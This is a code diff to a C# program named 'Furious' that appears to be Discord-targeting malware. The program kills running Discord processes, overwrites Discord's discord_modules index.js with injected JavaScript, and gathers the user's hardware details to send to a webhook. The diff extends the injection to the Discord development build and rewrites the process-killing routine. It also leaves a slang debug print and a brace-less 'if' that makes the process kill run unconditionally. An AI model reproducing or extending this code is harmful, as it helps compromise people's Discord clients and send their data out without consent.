@@ -7,6 +7,7 @@ using System.Net;
 using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
+using System.Linq;
 
 namespace Furious
 {
@@ -43,6 +44,7 @@ namespace Furious
 					Environment.Exit(0);
 			}
 			if (injectJS)
+				Console.WriteLine("CUM");
 				CloseProcesses();
 			if (getUserHardware)
 				await SendData(await GetHardware());
@@ -86,27 +88,34 @@ namespace Furious
 					{
 						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
 						await FileManagement.CleanFile(FileManagement.CanaryPath);
-                       				await FileManagement.WriteDiscord(FileManagement.CanaryPath);
+                        await FileManagement.WriteDiscord(FileManagement.CanaryPath);
+					}
+				}
+			}
+			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment"))
+			{
+				Console.WriteLine("FOUND DEV");
+				string[] dev = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment");
+				foreach (string folderName in dev)
+				{
+					if (folderName.Contains("0."))
+					{
+						Console.WriteLine(folderName);
+						FileManagement.DevelopmentPath = folderName + @"\modules\discord_modules\index.js";
+						await FileManagement.CleanFile(FileManagement.DevelopmentPath);
+						await FileManagement.WriteDiscord(FileManagement.DevelopmentPath);
 					}
 				}
 			}
 		}
 
 		///Closes all processes which contain "discord" in their name before writing the JS.
-		private static void CloseProcesses()
+		private static async void CloseProcesses()
 		{
-			foreach (Process process in Process.GetProcesses())
-			{
-				if (process.ProcessName.ToLower().Contains("discord"))
-				{
-					process.Kill();
-					process.Exited += async (a, e) =>
-					{
-						await InjectJS();
-					};
-				}
-			}
-		}
+			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
+
+			await InjectJS();
+        }
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 		public static async Task<string> GetHardware()
